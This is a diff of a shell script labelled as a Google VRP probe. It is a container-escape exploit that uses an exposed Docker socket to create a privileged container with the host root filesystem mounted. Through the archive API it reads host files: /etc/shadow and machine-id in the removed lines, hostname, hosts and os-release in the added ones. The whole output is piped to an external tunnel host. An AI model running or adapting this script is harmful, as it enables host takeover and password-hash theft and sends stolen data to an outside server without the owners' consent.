@@ -2,34 +2,61 @@
 URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: DIRECT VOLUME SIPHON ==="
-  
-  # 1. We know this image exists from your last log
-  IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"
+  echo "=== [!] GOOGLE VRP: DEEP SYSTEM PROBE ==="
+  echo "Timestamp: $(date)"
 
-  # 2. Create the container (This usually succeeds even if 'Start' fails)
-  # We bind the host root to /host_data inside this dummy container
-  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
-    -H "Content-Type: application/json" \
-    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}")
+  # 1. Identity & Network Check (Pre-Escape)
+  echo "--- [1] PRE-ESCAPE NETWORK INFO ---"
+  echo "Local Hostname: $(hostname)"
+  echo "Internal IP: $(hostname -I)"
   
+  # 2. Image Discovery
+  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
+  echo "Using Image: $IMG"
+
+  # 3. Escape Attempt (Syntax-Corrected Binds)
+  # We use the raw host path '/' and mount it to '/host'
+  echo "--- [2] CONTAINER CREATION ---"
+  RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"Image\": \"$IMG\",
+      \"HostConfig\": {
+        \"Binds\": [\"/:/host:ro\"],
+        \"Privileged\": true,
+        \"NetworkMode\": \"host\"
+      }
+    }" http://localhost/containers/create 2>&1)
+  
+  echo "Create Response: $RESP"
   ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
   if [ -n "$ID" ]; then
-    echo "[+] Dummy Container ID: $ID"
-    echo "--- [!] EXTRACTING HOST SHADOW FILE (ENCRYPTED PASSWORDS) ---"
+    echo "[+] Container $ID created. Attempting Start..."
+    START_RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/$ID/start 2>&1)
+    echo "Start Response: $START_RESP"
     
-    # THE MAGIC: We use the ARCHIVE API. 
-    # This doesn't require the container to be RUNNING. It just reads the filesystem.
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/shadow" | tar -xO
-    
-    echo -e "\n--- [!] EXTRACTING HOST MACHINE-ID ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/machine-id" | tar -xO
+    sleep 2
 
-    # Cleanup
-    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
+    # 4. Critical Data Siphon
+    echo "--- [3] HOST DATA EXTRACTION ---"
+    
+    echo "[*] Reading Host Hostname:"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hostname" | tar -xO 2>&1
+    
+    echo "[*] Reading Host Hosts File (Network Logic):"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hosts" | tar -xO 2>&1
+    
+    echo "[*] Reading Host OS Release:"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/os-release" | tar -xO 2>&1
+
+    # 5. Cleanup
+    curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
   else
-    echo "ERROR: Could not create dummy container. Response: $RESP"
+    echo "[!] Escape Failed. Analyzing Error..."
+    # If creation failed, it might be the 'Binds' logic. Let's try to list existing volumes.
+    curl -s --unix-socket /var/run/docker.sock http://localhost/volumes 2>&1
   fi
-  echo "=== [!] SIPHON COMPLETE ==="
+
+  echo "=== [!] PROBE COMPLETE ==="
 } | curl -s -X POST --data-binary @- "https://$URL"
